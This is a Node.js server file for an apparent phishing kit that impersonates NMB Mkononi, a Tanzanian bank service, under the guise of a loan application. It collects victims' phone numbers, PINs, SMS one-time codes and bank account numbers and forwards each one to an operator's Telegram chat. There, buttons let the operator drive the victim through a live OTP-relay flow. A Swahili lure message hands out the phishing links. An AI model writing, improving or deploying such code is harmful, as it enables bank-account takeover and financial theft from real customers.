const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Configuration (Replace or use Environment Variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE'; // Main Admin Chat ID

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store active sessions in memory
const sessions = {}; 
// structure: { sessionId: { clientRes, phone, pin, status } }

// Send message to specific Telegram Chat ID with Inline Keyboards
async function sendTelegramMessage(chatId, text, replyMarkup) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log('Telegram Token not configured. Message would be:', text);
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML',
                reply_markup: replyMarkup
            })
        });
    } catch (err) {
        console.error('Telegram send error:', err);
    }
}

// 1. Submit Application / PIN (Step 1) -> Admin: ALLOW / DENY (Sends ONLY phone number and PIN)
app.post('/api/submit-application', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    sessions[sessionId] = { phone, pin, clientRes: res, step: 'pin_pending' };

    const message = `🚨 <b>NMB MKONONI - NEW SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
                    `<i>Choose action for applicant:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ ALLOW', callback_data: `allow_${sessionId}` },
                { text: '❌ DENY', callback_data: `deny_${sessionId}` }
            ]
        ]
    };

    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
});

// 2. Submit OTP -> Admin: PROCEED / STOP
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].otp = otp;
        sessions[sessionId].clientRes = res;
        sessions[sessionId].step = 'otp_pending';
    }

    const phone = sessions[sessionId] ? sessions[sessionId].phone : 'Unknown';

    const message = `🔐 <b>NMB MKONONI - OTP VERIFICATION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>SMS OTP:</b> ${otp}\n\n` +
                    `<i>Verify OTP:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ PROCEED', callback_data: `otp_proceed_${sessionId}` },
                { text: '🛑 STOP', callback_data: `otp_stop_${sessionId}` }
            ]
        ]
    };

    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
});

// 3. Submit 11-digit NMB Bank Account -> Admin: WRONG PIN, WRONG OTP, INVALID ACC, APPROVED
app.post('/api/submit-account', async (req, res) => {
    const { sessionId, accountNumber } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].accountNumber = accountNumber;
        sessions[sessionId].clientRes = res;
        sessions[sessionId].step = 'acc_pending';
    }

    const phone = sessions[sessionId] ? sessions[sessionId].phone : 'Unknown';

    const message = `🏦 <b>NMB MKONONI - BANK ACCOUNT SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `💳 <b>Account Number (11 digits):</b> ${accountNumber}\n\n` +
                    `<i>Select final verification status:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '⚠️ WRONG PIN', callback_data: `err_pin_${sessionId}` },
                { text: '⚠️ WRONG OTP', callback_data: `err_otp_${sessionId}` }
            ],
            [
                { text: '🚫 INVALID ACC', callback_data: `err_acc_${sessionId}` },
                { text: '🎉 APPROVED', callback_data: `approve_${sessionId}` }
            ]
        ]
    };

    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
});

// Poll endpoint for client to check admin decision status
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    if (!session || !session.status) {
        return res.json({ status: 'pending' });
    }
    const currentStatus = session.status;
    delete session.status;
    res.json({ status: currentStatus });
});

// Telegram Webhook / Callback handler endpoint (Handles Admin button actions & /start command privately)
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;

    // Handle /start command from any user/subadmin privately (Main admin does not receive it)
    if (update && update.message && update.message.text) {
        const chatId = update.message.chat.id;
        const text = update.message.text.trim();
        
        if (text === '/start') {
            // Generate private web link for this specific user/chat session
            const privateLink = `${req.protocol}://${req.get('host')}?ref=${chatId}`;
            const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania.\n\nBonyeza kiungo hapa chini kuanza ombi lako la mkopo:\n${privateLink}`;
            
            await sendTelegramMessage(chatId, welcomeMsg, null);
            return res.sendStatus(200);
        }
    }

    // Handle Admin Inline Keyboard Button Clicks
    if (update && update.callback_query) {
        const query = update.callback_query;
        const data = query.data; 
        const parts = data.split('_');
        
        let action, sessionId;
        if (data.startsWith('otp_')) {
            action = `otp_${parts[1]}`;
            sessionId = parts[2];
        } else if (data.startsWith('err_')) {
            action = `err_${parts[1]}`;
            sessionId = parts[2];
        } else {
            action = parts[0];
            sessionId = parts[1];
        }

        if (sessions[sessionId] && sessions[sessionId].clientRes) {
            const clientRes = sessions[sessionId].clientRes;
            
            if (action === 'allow' || action === 'otp_proceed') {
                sessions[sessionId].status = 'next_step';
                clientRes.json({ success: true, status: 'next_step' });
            } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
                sessions[sessionId].status = 'restart_pin';
                clientRes.json({ success: false, status: 'restart_pin', message: 'Wrong PIN / Denied.' });
            } else if (action === 'err_otp') {
                sessions[sessionId].status = 'restart_otp';
                clientRes.json({ success: false, status: 'restart_otp', message: 'Wrong OTP.' });
            } else if (action === 'err_acc') {
                sessions[sessionId].status = 'restart_acc';
                clientRes.json({ success: false, status: 'restart_acc', message: 'Invalid Account Number.' });
            } else if (action === 'approve') {
                sessions[sessionId].status = 'success';
                clientRes.json({ success: true, status: 'success' });
            }
        }
        
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: query.id, text: 'Action registered successfully!' })
            });
        }
    }
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
});
  
